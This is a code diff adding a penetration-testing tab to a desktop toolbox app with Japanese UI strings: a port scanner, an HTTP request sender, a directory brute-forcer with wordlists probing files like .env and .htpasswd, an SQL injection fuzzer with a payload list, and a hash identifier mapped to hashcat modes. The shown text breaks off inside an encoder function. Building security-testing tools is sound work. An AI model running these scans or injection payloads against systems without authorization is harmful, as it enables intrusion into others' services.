@@ -1324,6 +1324,7 @@ async function setupToolbox(): Promise<void> {
   setupUserScriptTool();
   setupTechProfileTool();
   setupOGPTool();
+  setupPentestTool();
 }
 
 // ===== ファイル形式コンバータ =====
@@ -7388,4 +7389,1191 @@ function escapeHtml(s: string): string {
     .replace(/>/g, "&gt;")
     .replace(/"/g, "&quot;")
     .replace(/'/g, "&#39;");
+}
+
+// ===== 🛡️ ペネトレーション テストキット =====
+
+const TOP_100_PORTS = [
+  21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
+  1723, 3306, 3389, 5900, 8080, 8443,
+  20, 26, 37, 79, 81, 88, 106, 113, 119, 161, 179, 199, 389, 427, 444, 465,
+  513, 514, 515, 543, 544, 548, 554, 587, 631, 646, 873, 902, 990, 1025, 1026,
+  1027, 1028, 1029, 1110, 1433, 1434, 1521, 1755, 1900, 2000, 2001, 2049, 2121,
+  2717, 3128, 3268, 3690, 3986, 4899, 5000, 5009, 5051, 5060, 5101, 5190, 5357,
+  5432, 5631, 5666, 5800, 5985, 5986, 6000, 6001, 6646, 7070, 8000, 8008, 8009,
+  8081, 8888, 9100, 9999, 10000, 32768, 49152, 49153, 49154, 49155, 49156, 49157,
+];
+
+const COMMON_24_PORTS = [
+  21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 465,
+  587, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080,
+];
+
+function parsePortSpec(spec: string): number[] {
+  const out = new Set<number>();
+  for (const piece of spec.split(/[\s,]+/).filter(Boolean)) {
+    const m = piece.match(/^(\d+)\s*-\s*(\d+)$/);
+    if (m) {
+      const a = parseInt(m[1]);
+      const b = parseInt(m[2]);
+      const lo = Math.min(a, b);
+      const hi = Math.max(a, b);
+      for (let p = lo; p <= hi; p++) {
+        if (p >= 1 && p <= 65535) out.add(p);
+      }
+    } else {
+      const p = parseInt(piece);
+      if (Number.isFinite(p) && p >= 1 && p <= 65535) out.add(p);
+    }
+  }
+  return [...out].sort((a, b) => a - b);
+}
+
+const PORT_NAMES: Record<number, string> = {
+  21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http",
+  110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios-ssn", 143: "imap",
+  389: "ldap", 443: "https", 445: "smb", 465: "smtps", 587: "submission",
+  993: "imaps", 995: "pop3s", 1433: "mssql", 1521: "oracle", 2049: "nfs",
+  3000: "node-dev", 3306: "mysql", 3389: "rdp", 5432: "postgres", 5900: "vnc",
+  5985: "winrm", 6379: "redis", 8000: "http-alt", 8080: "http-proxy",
+  8443: "https-alt", 8888: "http-alt", 9090: "http-alt", 9200: "elasticsearch",
+  11211: "memcached", 27017: "mongodb",
+};
+
+interface PortScanRow {
+  port: number;
+  open: boolean;
+  banner: string | null;
+}
+
+function setupPortScannerSub(): void {
+  const hostEl = document.getElementById("ps-host") as HTMLInputElement | null;
+  const presetEl = document.getElementById("ps-preset") as HTMLSelectElement | null;
+  const portsEl = document.getElementById("ps-ports") as HTMLInputElement | null;
+  const bannerEl = document.getElementById("ps-banner") as HTMLInputElement | null;
+  const timeoutEl = document.getElementById("ps-timeout") as HTMLInputElement | null;
+  const runBtn = document.getElementById("ps-run") as HTMLButtonElement | null;
+  const statusEl = document.getElementById("ps-status") as HTMLSpanElement | null;
+  const outEl = document.getElementById("ps-out") as HTMLPreElement | null;
+  if (!hostEl || !runBtn || !outEl) return;
+
+  presetEl?.addEventListener("change", () => {
+    if (!portsEl) return;
+    if (presetEl.value === "top") portsEl.value = "(Top 100)";
+    else if (presetEl.value === "common") portsEl.value = "(よく使う 24)";
+    else if (presetEl.value === "all") portsEl.value = "1-1024";
+    else portsEl.value = "";
+  });
+
+  runBtn.addEventListener("click", async () => {
+    const host = hostEl.value.trim();
+    if (!host) {
+      if (statusEl) statusEl.textContent = "ホストを入力";
+      return;
+    }
+    let ports: number[] = [];
+    const preset = presetEl?.value || "top";
+    if (preset === "top") ports = TOP_100_PORTS;
+    else if (preset === "common") ports = COMMON_24_PORTS;
+    else if (preset === "all") {
+      ports = [];
+      for (let p = 1; p <= 1024; p++) ports.push(p);
+    } else {
+      ports = parsePortSpec(portsEl?.value || "");
+    }
+    if (ports.length === 0) {
+      if (statusEl) statusEl.textContent = "ポートが空です";
+      return;
+    }
+    if (statusEl)
+      statusEl.textContent = `${host} の ${ports.length} ポートをスキャン中…`;
+    outEl.textContent = "";
+    const t0 = performance.now();
+    try {
+      const rows = await invoke<PortScanRow[]>("pentest_port_scan", {
+        host,
+        ports,
+        timeoutMs: parseInt(timeoutEl?.value || "800"),
+        grabBanner: bannerEl?.checked ?? true,
+      });
+      const dt = Math.round(performance.now() - t0);
+      if (statusEl)
+        statusEl.textContent = `完了 (${rows.length} 個 OPEN / ${ports.length} スキャン / ${dt}ms)`;
+      const lines: string[] = [];
+      lines.push(`Host: ${host}`);
+      lines.push(`Open ports: ${rows.length} / ${ports.length}`);
+      lines.push("─".repeat(60));
+      lines.push("PORT     SERVICE        BANNER");
+      for (const r of rows) {
+        const svc = (PORT_NAMES[r.port] || "").padEnd(14);
+        const port = `${r.port}/tcp`.padEnd(8);
+        const banner = r.banner || "";
+        lines.push(`${port} ${svc} ${banner}`);
+      }
+      outEl.textContent = lines.join("\n");
+    } catch (e) {
+      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
+    }
+  });
+}
+
+interface HttpReqResultTS {
+  status: number;
+  status_text: string;
+  headers: [string, string][];
+  body: string;
+  bytes: number;
+  content_type: string;
+  time_ms: number;
+  final_url: string;
+}
+
+function parseHeaderLines(text: string): [string, string][] {
+  const out: [string, string][] = [];
+  for (const line of text.split(/\r?\n/)) {
+    const m = line.match(/^\s*([^:\s][^:]*?)\s*:\s*(.*)$/);
+    if (m) out.push([m[1], m[2]]);
+  }
+  return out;
+}
+
+function setupHttpReqSub(): void {
+  const methodEl = document.getElementById("hr-method") as HTMLSelectElement | null;
+  const urlEl = document.getElementById("hr-url") as HTMLInputElement | null;
+  const followEl = document.getElementById("hr-follow") as HTMLInputElement | null;
+  const sendBtn = document.getElementById("hr-send") as HTMLButtonElement | null;
+  const headersEl = document.getElementById("hr-headers") as HTMLTextAreaElement | null;
+  const bodyEl = document.getElementById("hr-body") as HTMLTextAreaElement | null;
+  const rawEl = document.getElementById("hr-raw") as HTMLTextAreaElement | null;
+  const rawLoadBtn = document.getElementById("hr-raw-load") as HTMLButtonElement | null;
+  const statusEl = document.getElementById("hr-status") as HTMLDivElement | null;
+  const respHeadersEl = document.getElementById("hr-resp-headers") as HTMLPreElement | null;
+  const respBodyEl = document.getElementById("hr-resp-body") as HTMLPreElement | null;
+  if (!sendBtn || !urlEl) return;
+
+  rawLoadBtn?.addEventListener("click", () => {
+    const text = rawEl?.value || "";
+    if (!text) return;
+    const lines = text.split(/\r?\n/);
+    const reqLine = lines[0]?.match(/^(\S+)\s+(\S+)\s+HTTP/);
+    if (!reqLine) {
+      alert("リクエスト行が読めません (例: POST /path HTTP/1.1)");
+      return;
+    }
+    const method = reqLine[1];
+    let path = reqLine[2];
+    let host = "";
+    const hdrLines: string[] = [];
+    let i = 1;
+    for (; i < lines.length; i++) {
+      const ln = lines[i];
+      if (ln.trim() === "") {
+        i++;
+        break;
+      }
+      hdrLines.push(ln);
+      const hm = ln.match(/^Host:\s*(.+)$/i);
+      if (hm) host = hm[1].trim();
+    }
+    const body = lines.slice(i).join("\n");
+    if (methodEl) methodEl.value = method;
+    const scheme = host.includes(":443") ? "https" : "http";
+    if (host && urlEl) urlEl.value = `${scheme}://${host}${path}`;
+    if (headersEl) headersEl.value = hdrLines.filter((l) => !/^host:/i.test(l)).join("\n");
+    if (bodyEl) bodyEl.value = body;
+  });
+
+  sendBtn.addEventListener("click", async () => {
+    const url = urlEl.value.trim();
+    if (!url) {
+      if (statusEl) statusEl.textContent = "URL を入力";
+      return;
+    }
+    if (statusEl) statusEl.textContent = "送信中…";
+    if (respHeadersEl) respHeadersEl.textContent = "";
+    if (respBodyEl) respBodyEl.textContent = "";
+    try {
+      const r = await invoke<HttpReqResultTS>("pentest_http_request", {
+        method: methodEl?.value || "GET",
+        url,
+        headers: parseHeaderLines(headersEl?.value || ""),
+        body: bodyEl?.value || null,
+        timeoutMs: 15000,
+        followRedirects: followEl?.checked ?? true,
+      });
+      if (statusEl)
+        statusEl.textContent = `${r.status} ${r.status_text} • ${r.bytes.toLocaleString()} bytes • ${r.time_ms}ms • ${r.content_type} • → ${r.final_url}`;
+      if (respHeadersEl)
+        respHeadersEl.textContent = r.headers.map(([k, v]) => `${k}: ${v}`).join("\n");
+      if (respBodyEl) respBodyEl.textContent = r.body;
+    } catch (e) {
+      if (statusEl) statusEl.textContent = `エラー: ${String(e)}`;
+    }
+  });
+}
+
+const WORDLIST_COMMON = `admin
+administrator
+api
+app
+assets
+backup
+backups
+blog
+cgi-bin
+config
+console
+dashboard
+data
+db
+debug
+dev
+download
+downloads
+env
+files
+forum
+ftp
+home
+images
+img
+include
+includes
+index
+info
+internal
+js
+json
+lib
+log
+login
+logs
+mail
+manager
+media
+old
+panel
+phpinfo
+phpmyadmin
+private
+public
+robots
+secret
+secure
+server-status
+setup
+shop
+site
+sites
+sql
+src
+staff
+staging
+static
+stats
+status
+storage
+support
+system
+templates
+temp
+test
+tmp
+tools
+upload
+uploads
+user
+users
+v1
+v2
+vendor
+web
+webadmin
+wordpress
+wp-admin
+wp-content
+wp-includes
+xml`;
+
+const WORDLIST_DIRB_SMALL = `${WORDLIST_COMMON}
+.git
+.svn
+.env
+.htaccess
+.htpasswd
+.well-known
+about
+account
+accounts
+ads
+ajax
+analytics
+archive
+asp
+aspnet_client
+auth
+beta
+billing
+build
+cache
+calendar
+career
+cart
+catalog
+chat
+checkout
+cms
+common
+contact
+content
+controllers
+core
+crm
+css
+custom
+customer
+default
+dist
+doc
+docs
+documents
+edit
+editor
+embed
+error
+errors
+events
+example
+export
+external
+fonts
+graphql
+help
+host
+images2
+import
+intranet
+inventory
+invoice
+issues
+java
+jobs
+keys
+layout
+ldap
+legacy
+library
+list
+local
+location
+mailer
+maintenance
+manage
+marketing
+member
+members
+messages
+mobile
+module
+modules
+monitoring
+news
+newsletter
+notice
+office
+oldsite
+order
+orders
+out
+page
+pages
+partner
+pay
+payment
+payments
+phpinfo.php
+phpunit
+pma
+plugins
+portal
+post
+posts
+preview
+profile
+profiles
+project
+projects
+proxy
+pub
+register
+report
+reports
+research
+restore
+review
+reviews
+rss
+sales
+search
+security
+service
+services
+shopping
+sign
+signup
+sitemap
+sitemap.xml
+soap
+software
+solutions
+spider
+ssl
+stage
+store
+stories
+subscribe
+suppliers
+survey
+sysadmin
+team
+test1
+test2
+testing
+tickets
+training
+trash
+update
+updates
+upgrade
+v3
+videos
+view
+welcome
+widget
+wiki`;
+
+let dbAbort = false;
+
+function setupDirBusterSub(): void {
+  const baseEl = document.getElementById("db-base") as HTMLInputElement | null;
+  const extEl = document.getElementById("db-ext") as HTMLInputElement | null;
+  const concEl = document.getElementById("db-conc") as HTMLInputElement | null;
+  const wlEl = document.getElementById("db-wordlist") as HTMLSelectElement | null;
+  const wordsEl = document.getElementById("db-words") as HTMLTextAreaElement | null;
+  const excludeEl = document.getElementById("db-exclude") as HTMLInputElement | null;
+  const runBtn = document.getElementById("db-run") as HTMLButtonElement | null;
+  const stopBtn = document.getElementById("db-stop") as HTMLButtonElement | null;
+  const statusEl = document.getElementById("db-status") as HTMLSpanElement | null;
+  const outEl = document.getElementById("db-out") as HTMLPreElement | null;
+  if (!baseEl || !runBtn || !outEl) return;
+
+  stopBtn?.addEventListener("click", () => {
+    dbAbort = true;
+  });
+
+  runBtn.addEventListener("click", async () => {
+    const base = baseEl.value.trim().replace(/\/+$/, "");
+    if (!base) {
+      if (statusEl) statusEl.textContent = "ベースURL 必須";
+      return;
+    }
+    let words: string[] = [];
+    const wl = wlEl?.value || "common";
+    if (wl === "common") words = WORDLIST_COMMON.split(/\n/);
+    else if (wl === "dirb-small") words = WORDLIST_DIRB_SMALL.split(/\n/);
+    else words = (wordsEl?.value || "").split(/\n/);
+    words = [...new Set(words.map((w) => w.trim()).filter(Boolean))];
+    const exts = (extEl?.value || "")
+      .split(/[,\s]+/)
+      .map((e) => e.replace(/^\./, "").trim())
+      .filter(Boolean);
+    const paths: string[] = [];
+    for (const w of words) {
+      paths.push(w);
+      for (const e of exts) paths.push(`${w}.${e}`);
+    }
+    const excludeSet = new Set(
+      (excludeEl?.value || "404")
+        .split(/[,\s]+/)
+        .map((s) => parseInt(s))
+        .filter((n) => Number.isFinite(n)),
+    );
+    const concurrency = Math.max(1, Math.min(30, parseInt(concEl?.value || "10")));
+    dbAbort = false;
+    outEl.textContent = "";
+    let done = 0;
+    let found = 0;
+    const total = paths.length;
+    if (statusEl) statusEl.textContent = `0/${total}`;
+    const queue = [...paths];
+    async function worker(): Promise<void> {
+      while (queue.length > 0 && !dbAbort) {
+        const p = queue.shift()!;
+        const url = `${base}/${p}`;
+        try {
+          const r = await invoke<HttpReqResultTS>("pentest_http_request", {
+            method: "GET",
+            url,
+            headers: [],
+            body: null,
+            timeoutMs: 8000,
+            followRedirects: false,
+          });
+          done++;
+          if (!excludeSet.has(r.status)) {
+            found++;
+            outEl!.textContent += `[${r.status}] ${url}  (${r.bytes}B)\n`;
+            outEl!.scrollTop = outEl!.scrollHeight;
+          }
+        } catch {
+          done++;
+        }
+        if (statusEl) statusEl.textContent = `${done}/${total} (発見 ${found})`;
+      }
+    }
+    const workers: Promise<void>[] = [];
+    for (let i = 0; i < concurrency; i++) workers.push(worker());
+    await Promise.all(workers);
+    if (statusEl)
+      statusEl.textContent = dbAbort
+        ? `中断 (${done}/${total}, 発見 ${found})`
+        : `完了 (${total}, 発見 ${found})`;
+  });
+}
+
+const SQLI_PAYLOADS = [
+  "'",
+  '"',
+  "' OR '1'='1",
+  "' OR '1'='1' --",
+  "\" OR \"1\"=\"1",
+  "' OR 1=1 --",
+  "') OR ('1'='1",
+  "' UNION SELECT NULL --",
+  "' AND SLEEP(3) --",
+  "1' AND 1=1--",
+  "1' AND 1=2--",
+  "admin'--",
+  "admin'/*",
+  "' OR 'a'='a",
+];
+
+const SQL_ERROR_PATTERNS = [
+  /SQL syntax/i,
+  /mysql_fetch/i,
+  /You have an error in your SQL syntax/i,
+  /Warning.*mysql/i,
+  /MySQLSyntaxError/i,
+  /PostgreSQL.*ERROR/i,
+  /pg_query\(\)/i,
+  /SQLite\/JDBCDriver/i,
+  /sqlite3.OperationalError/i,
+  /Microsoft.*ODBC.*SQL Server/i,
+  /Unclosed quotation mark/i,
+  /ORA-\d{5}/i,
+  /sqlite_error/i,
+  /supplied argument is not a valid MySQL/i,
+];
+
+function setupSqliSub(): void {
+  const urlEl = document.getElementById("sqli-url") as HTMLInputElement | null;
+  const methodEl = document.getElementById("sqli-method") as HTMLSelectElement | null;
+  const bodyEl = document.getElementById("sqli-body") as HTMLTextAreaElement | null;
+  const headersEl = document.getElementById("sqli-headers") as HTMLInputElement | null;
+  const runBtn = document.getElementById("sqli-run") as HTMLButtonElement | null;
+  const outEl = document.getElementById("sqli-out") as HTMLPreElement | null;
+  if (!runBtn || !outEl) return;
+
+  runBtn.addEventListener("click", async () => {
+    const baseUrl = urlEl?.value.trim() || "";
+    if (!baseUrl) {
+      outEl.textContent = "URL 必須";
+      return;
+    }
+    const method = methodEl?.value || "GET";
+    const bodyTpl = bodyEl?.value || "";
+    const headers = parseHeaderLines(headersEl?.value || "");
+    const lines: string[] = [];
+    lines.push(`# SQLi テスト: ${method} ${baseUrl}`);
+    outEl.textContent = "テスト中…\n";
+
+    // ベースラインリクエスト
+    let baseResp: HttpReqResultTS | null = null;
+    try {
+      baseResp = await invoke<HttpReqResultTS>("pentest_http_request", {
+        method,
+        url: method === "GET" ? baseUrl : baseUrl,
+        headers,
+        body: method === "GET" ? null : bodyTpl.replace(/<FUZZ>/g, "x"),
+        timeoutMs: 15000,
+        followRedirects: false,
+      });
+      lines.push(
+        `[baseline] ${baseResp.status} ${baseResp.status_text} (${baseResp.bytes}B, ${baseResp.time_ms}ms)`,
+      );
+    } catch (e) {
+      lines.push(`[baseline] エラー: ${e}`);
+    }
+
+    for (const payload of SQLI_PAYLOADS) {
+      let url = baseUrl;
+      let body: string | null = null;
+      if (method === "GET") {
+        if (baseUrl.includes("<FUZZ>")) url = baseUrl.replace(/<FUZZ>/g, encodeURIComponent(payload));
+        else {
+          // 最後のパラメータ値に payload を追加
+          url = baseUrl.replace(/=([^&]*)$/, `=${encodeURIComponent(payload)}`);
+        }
+      } else {
+        body = bodyTpl.replace(/<FUZZ>/g, encodeURIComponent(payload));
+      }
+      try {
+        const r = await invoke<HttpReqResultTS>("pentest_http_request", {
+          method,
+          url,
+          headers,
+          body,
+          timeoutMs: 15000,
+          followRedirects: false,
+        });
+        const flags: string[] = [];
+        for (const re of SQL_ERROR_PATTERNS) {
+          if (re.test(r.body)) {
+            flags.push(`ERR(${re.source.slice(0, 20)})`);
+            break;
+          }
+        }
+        if (baseResp && Math.abs(r.bytes - baseResp.bytes) > 200) {
+          flags.push(`Δlen=${r.bytes - baseResp.bytes}`);
+        }
+        if (baseResp && r.status !== baseResp.status) {
+          flags.push(`Δstatus=${r.status}`);
+        }
+        if (r.time_ms > 2500 && payload.toLowerCase().includes("sleep")) {
+          flags.push(`SLOW(${r.time_ms}ms)`);
+        }
+        const tag = flags.length ? ` ⚠️ ${flags.join(" ")}` : "";
+        lines.push(
+          `${r.status.toString().padStart(3)} ${r.bytes.toString().padStart(6)}B ${r.time_ms.toString().padStart(5)}ms  ${payload}${tag}`,
+        );
+        outEl.textContent = lines.join("\n");
+      } catch (e) {
+        lines.push(`ERR ${payload}: ${e}`);
+        outEl.textContent = lines.join("\n");
+      }
+    }
+    lines.push("\n# ⚠️ マークがついた行は SQLi の可能性あり。sqlmap で詳細確認推奨");
+    outEl.textContent = lines.join("\n");
+  });
+}
+
+interface HashSig {
+  name: string;
+  hashcat: string;
+  pattern: RegExp;
+}
+
+const HASH_SIGNATURES: HashSig[] = [
+  { name: "MD5", hashcat: "0", pattern: /^[a-f0-9]{32}$/i },
+  { name: "SHA-1", hashcat: "100", pattern: /^[a-f0-9]{40}$/i },
+  { name: "SHA-224", hashcat: "1300", pattern: /^[a-f0-9]{56}$/i },
+  { name: "SHA-256", hashcat: "1400", pattern: /^[a-f0-9]{64}$/i },
+  { name: "SHA-384", hashcat: "10800", pattern: /^[a-f0-9]{96}$/i },
+  { name: "SHA-512", hashcat: "1700", pattern: /^[a-f0-9]{128}$/i },
+  { name: "NTLM", hashcat: "1000", pattern: /^[a-f0-9]{32}$/i },
+  { name: "MySQL323", hashcat: "200", pattern: /^[a-f0-9]{16}$/i },
+  { name: "MySQL5", hashcat: "300", pattern: /^\*[A-F0-9]{40}$/i },
+  { name: "bcrypt", hashcat: "3200", pattern: /^\$2[abxy]?\$\d+\$[./A-Za-z0-9]{53}$/ },
+  { name: "MD5 crypt ($1$)", hashcat: "500", pattern: /^\$1\$[^$]{1,8}\$[./A-Za-z0-9]{22}$/ },
+  { name: "SHA-256 crypt ($5$)", hashcat: "7400", pattern: /^\$5\$[^$]{1,16}\$[./A-Za-z0-9]{43}$/ },
+  { name: "SHA-512 crypt ($6$)", hashcat: "1800", pattern: /^\$6\$[^$]{1,16}\$[./A-Za-z0-9]{86}$/ },
+  { name: "Apache APR1 ($apr1$)", hashcat: "1600", pattern: /^\$apr1\$[^$]{1,8}\$[./A-Za-z0-9]{22}$/ },
+  { name: "Argon2", hashcat: "—", pattern: /^\$argon2(id|i|d)\$/ },
+  { name: "PBKDF2-SHA256", hashcat: "10900", pattern: /^pbkdf2_sha256\$/ },
+  { name: "Django PBKDF2", hashcat: "10000", pattern: /^pbkdf2_sha\d+\$\d+\$/ },
+  { name: "phpBB3 ($H$)", hashcat: "400", pattern: /^\$H\$[./A-Za-z0-9]{31}$/ },
+  { name: "WordPress ($P$)", hashcat: "400", pattern: /^\$P\$[./A-Za-z0-9]{31}$/ },
+  { name: "JWT", hashcat: "16500", pattern: /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/ },
+  { name: "CRC32", hashcat: "11500", pattern: /^[a-f0-9]{8}$/i },
+  { name: "LM", hashcat: "3000", pattern: /^[a-f0-9]{32}$/i },
+];
+
+function setupHashIdSub(): void {
+  const inEl = document.getElementById("hi-input") as HTMLInputElement | null;
+  const runBtn = document.getElementById("hi-run") as HTMLButtonElement | null;
+  const outEl = document.getElementById("hi-out") as HTMLDivElement | null;
+  if (!runBtn || !outEl) return;
+  function detect(): void {
+    const v = (inEl?.value || "").trim();
+    if (!v) {
+      outEl!.innerHTML = "";
+      return;
+    }
+    const matches = HASH_SIGNATURES.filter((s) => s.pattern.test(v));
+    if (matches.length === 0) {
+      outEl!.innerHTML = `<span style="color:#cf222e">未知のハッシュ形式 (長さ: ${v.length})</span>`;
+      return;
+    }
+    outEl!.innerHTML = matches
+      .map(
+        (m) =>
+          `<div style="padding:4px 8px;border:1px solid #ddd;border-radius:4px;margin-bottom:4px;background:#fff"><strong>${escapeHtml(m.name)}</strong> <code style="color:#666">hashcat -m ${m.hashcat}</code> &nbsp; <code style="color:#666">john --format=${m.name.toLowerCase().replace(/\s.*/, "")}</code></div>`,
+      )
+      .join("");
+  }
+  runBtn.addEventListener("click", detect);
+  inEl?.addEventListener("input", detect);
+}
+
+async function digestHex(algo: string, text: string): Promise<string> {
+  const buf = new TextEncoder().encode(text);
+  const out = await crypto.subtle.digest(algo, buf);
+  return [...new Uint8Array(out)]
+    .map((b) => b.toString(16).padStart(2, "0"))
+    .join("");
+}
+
+function md5(text: string): string {
+  // 簡易 MD5 実装 (RFC1321)
+  function add32(a: number, b: number): number {
+    return (a + b) & 0xffffffff;
+  }
+  function rol(n: number, c: number): number {
+    return (n << c) | (n >>> (32 - c));
+  }
+  function cmn(q: number, a: number, b: number, x: number, s: number, t: number): number {
+    a = add32(add32(a, q), add32(x, t));
+    return add32(rol(a, s), b);
+  }
+  function ff(a: number, b: number, c: number, d: number, x: number, s: number, t: number): number { return cmn((b & c) | (~b & d), a, b, x, s, t); }
+  function gg(a: number, b: number, c: number, d: number, x: number, s: number, t: number): number { return cmn((b & d) | (c & ~d), a, b, x, s, t); }
+  function hh(a: number, b: number, c: number, d: number, x: number, s: number, t: number): number { return cmn(b ^ c ^ d, a, b, x, s, t); }
+  function ii(a: number, b: number, c: number, d: number, x: number, s: number, t: number): number { return cmn(c ^ (b | ~d), a, b, x, s, t); }
+  const bytes: number[] = [];
+  const enc = new TextEncoder().encode(text);
+  for (const b of enc) bytes.push(b);
+  const len = bytes.length * 8;
+  bytes.push(0x80);
+  while (bytes.length % 64 !== 56) bytes.push(0);
+  for (let i = 0; i < 8; i++) bytes.push((len >>> (8 * i)) & 0xff);
+  let a = 0x67452301, b = 0xefcdab89, c = 0x98badcfe, d = 0x10325476;
+  for (let i = 0; i < bytes.length; i += 64) {
+    const x: number[] = new Array(16);
+    for (let j = 0; j < 16; j++) {
+      x[j] =
+        bytes[i + j * 4] |
+        (bytes[i + j * 4 + 1] << 8) |
+        (bytes[i + j * 4 + 2] << 16) |
+        (bytes[i + j * 4 + 3] << 24);
+    }
+    const aa = a, bb = b, cc = c, dd = d;
+    a = ff(a, b, c, d, x[0], 7, -680876936); d = ff(d, a, b, c, x[1], 12, -389564586);
+    c = ff(c, d, a, b, x[2], 17, 606105819); b = ff(b, c, d, a, x[3], 22, -1044525330);
+    a = ff(a, b, c, d, x[4], 7, -176418897); d = ff(d, a, b, c, x[5], 12, 1200080426);
+    c = ff(c, d, a, b, x[6], 17, -1473231341); b = ff(b, c, d, a, x[7], 22, -45705983);
+    a = ff(a, b, c, d, x[8], 7, 1770035416); d = ff(d, a, b, c, x[9], 12, -1958414417);
+    c = ff(c, d, a, b, x[10], 17, -42063); b = ff(b, c, d, a, x[11], 22, -1990404162);
+    a = ff(a, b, c, d, x[12], 7, 1804603682); d = ff(d, a, b, c, x[13], 12, -40341101);
+    c = ff(c, d, a, b, x[14], 17, -1502002290); b = ff(b, c, d, a, x[15], 22, 1236535329);
+    a = gg(a, b, c, d, x[1], 5, -165796510); d = gg(d, a, b, c, x[6], 9, -1069501632);
+    c = gg(c, d, a, b, x[11], 14, 643717713); b = gg(b, c, d, a, x[0], 20, -373897302);
+    a = gg(a, b, c, d, x[5], 5, -701558691); d = gg(d, a, b, c, x[10], 9, 38016083);
+    c = gg(c, d, a, b, x[15], 14, -660478335); b = gg(b, c, d, a, x[4], 20, -405537848);
+    a = gg(a, b, c, d, x[9], 5, 568446438); d = gg(d, a, b, c, x[14], 9, -1019803690);
+    c = gg(c, d, a, b, x[3], 14, -187363961); b = gg(b, c, d, a, x[8], 20, 1163531501);
+    a = gg(a, b, c, d, x[13], 5, -1444681467); d = gg(d, a, b, c, x[2], 9, -51403784);
+    c = gg(c, d, a, b, x[7], 14, 1735328473); b = gg(b, c, d, a, x[12], 20, -1926607734);
+    a = hh(a, b, c, d, x[5], 4, -378558); d = hh(d, a, b, c, x[8], 11, -2022574463);
+    c = hh(c, d, a, b, x[11], 16, 1839030562); b = hh(b, c, d, a, x[14], 23, -35309556);
+    a = hh(a, b, c, d, x[1], 4, -1530992060); d = hh(d, a, b, c, x[4], 11, 1272893353);
+    c = hh(c, d, a, b, x[7], 16, -155497632); b = hh(b, c, d, a, x[10], 23, -1094730640);
+    a = hh(a, b, c, d, x[13], 4, 681279174); d = hh(d, a, b, c, x[0], 11, -358537222);
+    c = hh(c, d, a, b, x[3], 16, -722521979); b = hh(b, c, d, a, x[6], 23, 76029189);
+    a = hh(a, b, c, d, x[9], 4, -640364487); d = hh(d, a, b, c, x[12], 11, -421815835);
+    c = hh(c, d, a, b, x[15], 16, 530742520); b = hh(b, c, d, a, x[2], 23, -995338651);
+    a = ii(a, b, c, d, x[0], 6, -198630844); d = ii(d, a, b, c, x[7], 10, 1126891415);
+    c = ii(c, d, a, b, x[14], 15, -1416354905); b = ii(b, c, d, a, x[5], 21, -57434055);
+    a = ii(a, b, c, d, x[12], 6, 1700485571); d = ii(d, a, b, c, x[3], 10, -1894986606);
+    c = ii(c, d, a, b, x[10], 15, -1051523); b = ii(b, c, d, a, x[1], 21, -2054922799);
+    a = ii(a, b, c, d, x[8], 6, 1873313359); d = ii(d, a, b, c, x[15], 10, -30611744);
+    c = ii(c, d, a, b, x[6], 15, -1560198380); b = ii(b, c, d, a, x[13], 21, 1309151649);
+    a = ii(a, b, c, d, x[4], 6, -145523070); d = ii(d, a, b, c, x[11], 10, -1120210379);
+    c = ii(c, d, a, b, x[2], 15, 718787259); b = ii(b, c, d, a, x[9], 21, -343485551);
+    a = add32(a, aa); b = add32(b, bb); c = add32(c, cc); d = add32(d, dd);
+  }
+  function hex(n: number): string {
+    let s = "";
+    for (let i = 0; i < 4; i++) s += ((n >>> (i * 8)) & 0xff).toString(16).padStart(2, "0");
+    return s;
+  }
+  return hex(a) + hex(b) + hex(c) + hex(d);
+}
+
+function setupHashGenSub(): void {
+  const inEl = document.getElementById("hg-input") as HTMLTextAreaElement | null;
+  const runBtn = document.getElementById("hg-run") as HTMLButtonElement | null;
+  const outEl = document.getElementById("hg-out") as HTMLPreElement | null;
+  if (!runBtn || !outEl) return;
+  runBtn.addEventListener("click", async () => {
+    const text = inEl?.value || "";
+    const lines: string[] = [];
+    lines.push(`MD5     : ${md5(text)}`);
+    lines.push(`SHA-1   : ${await digestHex("SHA-1", text)}`);
+    lines.push(`SHA-256 : ${await digestHex("SHA-256", text)}`);
+    lines.push(`SHA-384 : ${await digestHex("SHA-384", text)}`);
+    lines.push(`SHA-512 : ${await digestHex("SHA-512", text)}`);
+    lines.push(`Base64  : ${btoa(unescape(encodeURIComponent(text)))}`);
+    lines.push(`URL enc : ${encodeURIComponent(text)}`);
+    outEl.textContent = lines.join("\n");
+  });
+}
+
+function setupEncodeSub(): void {
+  const modeEl = document.getElementById("enc-mode") as HTMLSelectElement | null;
+  const runBtn = document.getElementById("enc-run") as HTMLButtonElement | null;
+  const inEl = document.getElementById("enc-input") as HTMLTextAreaElement | null;
+  const outEl = document.getElementById("enc-output") as HTMLTextAreaElement | null;
+  if (!runBtn || !inEl || !outEl) return;
+  runBtn.addEventListener("click", () => {
+    const text = inEl.value;
+    const mode = modeEl?.value || "b64e";
+    try {
+      let r = "";
+      if (mode === "b64e") r = btoa(unescape(encodeURIComponent(text)));
+      else if (mode === "b64d") r = decodeURIComponent(escape(atob(text)));
+      else if (mode === "urle") r = encodeURIComponent(text);
+      else if (mode === "urld") r = decodeURIComponent(text);
+      else if (mode === "htme") r = text.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]!);
+      else if (mode === "htmd")
+        r = text.replace(/&(amp|lt|gt|quot|#39|nbsp);/g, (_m, e) =>
+          ({ amp: "&", lt: "<", gt: ">", quot: '"', "#39": "'", nbsp: " " })[e as string] || _m,
+        );
+      else if (mode === "hexe")
+        r = [...new TextEncoder().encode(text)].map((b) => b.toString(16).padStart(2, "0")).join("");
+      else if (mode === "hexd") {
+        const cleaned = text.replace(/[^a-fA-F0-9]/g, "");
+        const bytes = new Uint8Array(cleaned.length / 2);
+        for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(cleaned.substr(i * 2, 2), 16);
+        r = new TextDecoder().decode(bytes);
+      } else if (mode === "rot13")
+        r = text.replace(/[a-zA-Z]/g, (c) => {
+          const a = c <= "Z" ? 65 : 97;
